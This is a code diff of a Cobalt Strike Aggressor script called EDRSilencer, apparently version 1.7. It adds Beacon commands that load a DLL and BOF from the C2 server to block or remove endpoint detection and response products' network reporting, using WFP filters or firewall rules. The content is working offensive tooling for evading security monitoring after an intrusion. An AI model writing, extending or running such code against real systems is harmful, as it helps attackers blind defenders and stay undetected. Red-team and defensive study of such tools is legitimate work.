@@ -1,23 +1,74 @@
-command "edr_block" {
-    local('$bid $dll_bytes $bof_args');
-    $bid = $1;
+# EDRSilencer - Cobalt Strike Aggressor Script V1.7
+
+# Global state to track the current mode
+$edr_silencer_mode = "wfp"; # Default mode
+
+sub execute_edrsilencer_bof {
+    local('$bid $command $arg1 $dll_bytes $bof_args');
+    ($bid, $command, $arg1) = @_;
 
     # Read the DLL file from the C2 server's disk
-    $dll_path = script_resource("EDRSilencer.dll");
+    $dll_path = script_resource("EDRSilencer/EDRSilencer.dll");
     $handle = openf($dll_path);
     $dll_bytes = readb($handle, -1);
     closef($handle);
 
     # Read the BOF file
-    $bof_path = script_resource("block_edr.x64.o");
+    $bof_path = script_resource("EDRSilencer/bof_loader.x64.o");
     $handle = openf($bof_path);
     $bof_bytes = readb($handle, -1);
     closef($handle);
-    
-    # Pack the DLL bytes as an argument for the BOF
-    $bof_args = bof_pack($bid, "b", $dll_bytes);
+
+    # Pack the DLL bytes and command as arguments for the BOF
+    if ($command eq "setmode") {
+        $bof_args = bof_pack($bid, "bzi", $dll_bytes, $command, $arg1);
+    } else if ($arg1 is $null) {
+        $bof_args = bof_pack($bid, "bz", $dll_bytes, $command);
+    } else {
+        $bof_args = bof_pack($bid, "bzz", $dll_bytes, $command, $arg1);
+    }
 
     # Execute the BOF in the Beacon
-    BeaconPrintf($bid, "[+] Executing EDRSilencer BOF...");
+    BeaconPrintf($bid, "[+] Executing EDRSilencer BOF in [" . $edr_silencer_mode . "] mode for command: " . $command);
     bof_execute($bid, $bof_bytes, $bof_args);
+}
+
+command "edr_set_mode" {
+    local('$bid $mode $use_firewall');
+    ($bid, $mode) = @_;
+
+    if ($mode eq "firewall") {
+        $use_firewall = 1;
+        $edr_silencer_mode = "firewall";
+        binfo($bid, "EDRSilencer mode set to Firewall.");
+    } else if ($mode eq "wfp") {
+        $use_firewall = 0;
+        $edr_silencer_mode = "wfp";
+        binfo($bid, "EDRSilencer mode set to WFP (default).");
+    } else {
+        berror($bid, "Invalid mode. Use 'firewall' or 'wfp'.");
+        return;
+    }
+    # The BOF needs to load the DLL first before it can call a function
+    execute_edrsilencer_bof($1, "setmode", $use_firewall);
+}
+
+command "edr_block" {
+    execute_edrsilencer_bof($1, "block", $null);
+}
+
+command "edr_add" {
+    execute_edrsilencer_bof($1, "add", $2);
+}
+
+command "edr_remove" {
+    execute_edrsilencer_bof($1, "removeid", $2);
+}
+
+command "edr_removeall" {
+    execute_edrsilencer_bof($1, "removeall", $null);
+}
+
+command "edr_initialize" {
+    execute_edrsilencer_bof($1, "init", $null);
 }
